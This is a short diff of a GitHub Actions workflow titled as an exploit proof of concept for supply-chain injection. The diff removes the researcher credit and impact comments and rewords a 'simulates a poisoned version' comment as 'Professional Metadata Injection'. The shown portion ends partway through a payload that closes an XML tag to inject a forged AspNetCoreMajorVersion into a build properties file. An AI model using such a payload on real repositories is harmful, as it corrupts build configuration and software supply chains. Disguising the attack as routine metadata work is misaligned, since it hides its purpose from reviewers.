@@ -1,7 +1,4 @@
 name: "Exploit PoC: Supply Chain Injection"
-# Researcher: HackerMD
-# Impact: Unauthorized modification of eng/Versions.props
-
 on:
   workflow_dispatch:
 
@@ -16,5 +13,5 @@ jobs:
       - name: "Inject Malicious Metadata"
         id: metadata
         run: |
-          # This simulates a poisoned version from an untrusted source
+          # Professional Metadata Injection
           PAYLOAD='1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
